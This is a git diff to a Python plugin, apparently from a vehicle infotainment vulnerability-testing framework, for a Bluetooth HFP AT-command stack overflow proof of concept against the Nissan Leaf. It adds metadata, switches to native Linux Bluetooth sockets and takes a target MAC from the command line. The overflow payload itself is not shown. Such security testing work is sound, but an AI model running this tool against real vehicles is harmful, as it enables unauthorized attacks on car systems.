@@ -18,6 +18,15 @@ class NissanBlueOverflowPlugin(IVIVulnerabilityPlugin):
     """
     CVE-2025-32059: Nissan Leaf Bluetooth HFP Stack Overflow
     """
+    meta_poc_name = "BT HFP AT Overflow"
+    meta_cve_id = "N/A"
+    meta_severity = "Medium"
+    meta_protocol = "rf"
+    meta_target_os = ["all"]
+    meta_required_params = ["target_mac"]
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
     def __init__(self, target_config, logger=None):
         super().__init__(target_config, logger)
         # target_config 应包含 'target_mac'
@@ -30,11 +39,9 @@ class NissanBlueOverflowPlugin(IVIVulnerabilityPlugin):
         if not self.target_mac:
             self.logger.error("需提供目标蓝牙MAC地址")
             return False
-        # 简单检查PyBluez是否安装
-        try:
-            import bluetooth
-        except ImportError:
-            self.logger.error("缺少 pybluez 库。请安装: sudo apt install python3-bluez && pip install pybluez")
+        # Python 3.3+ on Linux natively supports socket.AF_BLUETOOTH, so no external libraries (like pybluez2) are actually needed!
+        if not hasattr(socket, 'AF_BLUETOOTH'):
+            self.logger.error("This OS does not support native Bluetooth sockets via Python. Please run on Linux.")
             return False
         return True
 
@@ -82,5 +89,5 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 40_BT_HFP_AT_Overflow.py <target_mac_address>")
         sys.exit(1)
-    plugin = NissanBlueOverflowPlugin(config)
+    plugin = NissanBlueOverflowPlugin({"target_mac": sys.argv[1]})
     plugin.run_verify()
